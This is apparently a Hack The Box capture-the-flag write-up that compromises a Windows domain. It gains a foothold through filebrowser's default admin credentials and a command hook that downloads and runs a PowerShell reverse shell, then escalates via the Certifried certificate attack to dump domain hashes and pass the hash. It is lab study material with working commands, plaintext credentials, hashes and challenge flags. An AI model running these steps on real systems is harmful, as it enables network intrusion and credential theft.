Challenge Description:

A Certification Authority has declined our requests to access their data in order to identify a well known APT group. Unfortunately we do not have the jurisdiction to force them to cooperate. For this reason you are tasked with hacking their infrastructure in order to gather information.

Nmap found the following ports and includes the domain certification.htb and CFN-SVRDC01.certification.htb.

![image](https://user-images.githubusercontent.com/80063008/179422508-2e28dbf0-fea5-437d-b4e6-d606eacacbaa.png)


The page on port 80 is static. Nothing to see here.

![image](https://user-images.githubusercontent.com/80063008/179422512-77c3324e-0ea9-4383-b57c-a3e570248f99.png)


On port 8000 we have something more interesting. A file browser app.

![image](https://user-images.githubusercontent.com/80063008/179422514-95c76b4c-e33c-4abc-b120-ed5978575c51.png)


Which very nicely has default credentials of admin:admin

![image](https://user-images.githubusercontent.com/80063008/179422517-c701a477-aa1d-4a20-9227-31ee17e0a29c.png)


The global settings for filebrowser allows me to set commands to be executed on certain actions.

![image](https://user-images.githubusercontent.com/80063008/179422525-38f195ec-8bcc-4578-bf59-d543da0cfe84.png)


Actions like the ones listed below:

![image](https://user-images.githubusercontent.com/80063008/179422526-3ffb5510-e410-4e27-9201-5b6e2fc5e53d.png)


I used a powershell command to grab an obfuscated reverse shell from my box and run it. The link below is the obfuscated reverse shell I used.

https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/invoke_expression/obfuscated/invoke_obfuscation/powershell_reverse_tcp_obfuscated.ps1

![image](https://user-images.githubusercontent.com/80063008/179422528-d64b8718-8529-4b6b-b530-733e64177e9c.png)

The python script below just automates the process. I log in to grab a JWT cookie, set the command to trigger on file upload and then I upload something.

```python
import requests

loginURL = 'http://certification.htb:8000/api/login'
headers = {"Content-Type":"application/json"}
data = {"username":"admin","password":"admin","recaptcha":""}

r = requests.post(loginURL, headers=headers, json=data)
cook = r.text

cmdURL = 'http://certification.htb:8000/api/settings'
headers2 = {"X-Auth":f"{cook}","Cookie":f"auth={cook}", "Content-Type":"text/plain"}
data1 = '{"signup":false,"createUserDir":false,"userHomeBasePath":"/users","defaults":{"scope":".","locale":"en","viewMode":"mosaic","singleClick":false,"sorting":{"by":"","asc":false},"perm":{"admin":true,"execute":true,"create":true,"rename":true,"modify":true,"delete":true,"share":true,"download":true},"commands":[],"hideDotfiles":false,"dateFormat":false},"rules":[],"branding":{"name":"","disableExternal":false,"files":"","theme":"dark","color":""},"shell":[],"commands":{"after_copy":[],"after_delete":[],"after_rename":[],"after_save":[],"after_upload":["powershell IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.14.72/shell.ps1\')"],"before_copy":[],"before_delete":[],"before_rename":[],"before_save":[],"before_upload":[]}}'
x = requests.put(cmdURL, headers=headers2,data=data1)

readme = 'http://certification.htb:8000/api/resources/test/README.txt?override=true'
data2 = 'data'
z = requests.post(readme, headers=headers2, data=data2)
```

And we have the server grabbing our file

![image](https://user-images.githubusercontent.com/80063008/179422534-85e57e78-b6e1-4ae7-afd7-a3b0f519fe1a.png)


And a reverse shell foothold. Checking who we are, it looks like we are daniel.morgan with no specific, easy to exploit privileges.

![image](https://user-images.githubusercontent.com/80063008/179422538-c66a7739-92fc-4bdd-841b-2e37b027aaef.png)


But we do get the user flag easily enough.

![image](https://user-images.githubusercontent.com/80063008/179422540-8938e249-1223-4f52-8ad2-b211d989f406.png)

HTB{Abu51ng_F34tur3s_4r3_fun}

In the powershell script we also find the user's credentials.

![image](https://user-images.githubusercontent.com/80063008/179422544-6e3cb701-57f4-46d4-8a45-adf83ebbee02.png)

daniel.morgan  
FDOnolk(naws)

We can confirm they are still valid with kerbrute.

![image](https://user-images.githubusercontent.com/80063008/179422755-93fcbef2-a569-4e82-a1b2-0a179c4c1425.png)


## ADCS exploit - PRIVESC ##

Based on the name of the challenge and the fact that I saw this exploit mentioned on twitter pretty often recently, I researched for quite  abit. Then I followed this blogpost. This was after hours of going back and forth to a filebrowser.bat that the user had control over and WinPEAS told me that the administrator will run it when daniel logs in. Because of this I kept trying to forward port 5985 for WinRM but failed because of proper AV and firewall settings.

https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4

We start the ADCS exploit by getting the certipy app installed.

```bash
git clone https://github.com/ly4k/Certipy  
cd Certipy  
virtualenv -p /usr/bin/python3.10 venv3  
source venv3/bin/activate  
python3 setup.py install  
```
On the github page of the tool we see we can use it to find the existing certificate templates.

![image](https://user-images.githubusercontent.com/80063008/179422551-e7d7a6c4-60e6-4559-9a35-520e474c676d.png)


Step 1: Find what certificate templates are available.
```bash
certipy find certification.htb/daniel.morgan:'FDOnolk(naws)'@certification.htb
```
![image](https://user-images.githubusercontent.com/80063008/179422552-fbe83cbf-c85d-4de2-bcef-16c3f7adbb22.png)

I had to make sure I had the CA name properly written down. It is mentioned in the certipy out as well.

![image](https://user-images.githubusercontent.com/80063008/179422572-526430db-28dd-4332-ab78-851c18bab106.png)

Step 2: Add a machine computer.
```bash
addcomputer.py 'CERTIFICATION.htb/daniel.morgan:FDOnolk(naws)' -method LDAPS -computer-name CFN-FAKE -computer-pass 'lazytitan'
```
![image](https://user-images.githubusercontent.com/80063008/179422582-efc846ab-7b0d-48a4-bcb6-4d01870cb2ae.png)

Step 3: Request a certificate for the above created machine account.
```bash
certipy req -ca certification-CFN-SVRDC01-CA -template Machine CFN-SVRDC01.certification.htb/CFN-FAKE$:lazytitan@CFN-SVRDC01.certification.htb
```
May need a few tries if getting an error about rpc time out..

![image](https://user-images.githubusercontent.com/80063008/179422587-da42aea0-2894-4a59-bac6-36b4d0359586.png)

Step 4: Authenticate with the pfx file to get the hash, just to check that it's good.

```bash
certipy auth -pfx cfn-fake.pfx 
```
![image](https://user-images.githubusercontent.com/80063008/179422591-45b0c7c9-8c80-4b04-aa72-7607b0415967.png)

Step 5: From the compromised low priv account, find the current DNSHostName just to check. Looks good.
```powershell
Get-ADComputer "CFN-FAKE" -Properties *|findstr DNSHostName
```
![image](https://user-images.githubusercontent.com/80063008/179422596-e662e91b-9b44-49ad-aa6e-67d7a3b5d258.png)

Step 6: Test to ensure you can change it.
```powershell
Set-ADComputer -Identity "CFN-FAKE" -DNSHostName 'test.certification.htb'
```
![image](https://user-images.githubusercontent.com/80063008/179422605-583ce263-4c4d-4fce-ae3c-dbec849c459f.png)

Step 7: Check the properties of the servicePrincipalName.
```powershell
Get-ADComputer "CFN-FAKE" -Properties *
```
![image](https://user-images.githubusercontent.com/80063008/179422615-d2244cb6-8c53-40e4-bfe2-0465459c709f.png)

Step 8: If it already has stuff in it, clear it using the syntax below.
```powershell
Set-ADComputer -Identity "CFN-FAKE" -servicePrincipalName $null
```
Step 9: put the Domain Controllers name instead.
```powershell
Set-ADComputer -Identity "CFN-FAKE" -DNSHostName 'CFN-SVRDC01.certification.htb'
```
![image](https://user-images.githubusercontent.com/80063008/179422626-e4faf5ef-8943-4ceb-b9ed-3d52ff363a38.png)

Step 10: request another certificate and this time, it should be for the DC.

![image](https://user-images.githubusercontent.com/80063008/179422628-aef87599-5646-41df-8ca4-a5ba1332a969.png)

Step 11: authenticate with the generated DC pfx file to get the NTLM hash.

![image](https://user-images.githubusercontent.com/80063008/179422631-532dfe8e-114d-455d-976e-26630cc0d61d.png)

Step 12: Use the DC hash above to dump the hashes using secretsdump.py
```bash
secretsdump.py 'certification.htb/CFN-SVRDC01$@CFN-SVRDC01.certification.htb' -hashes :d85512d5e138a972140986b9cc664d7a
```
![image](https://user-images.githubusercontent.com/80063008/179422634-6f50e2bc-dfec-4d9d-af39-b4ed63396891.png)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:30d9a71719214d675de29308730c0cb0:::

Step 13: Use wmiexec to pass the hash -- PROFIT.
```bash
wmiexec.py certification.htb/administrator@CFN-SVRDC01.certification.htb -hashes aad3b435b51404eeaad3b435b51404ee:30d9a71719214d675de29308730c0cb0
```
![image](https://user-images.githubusercontent.com/80063008/179422638-34bf265e-3b91-4f6e-837f-e8bd209142ff.png)



HTB{c3rtif1c4t35_c4n_8e_f4k3d}
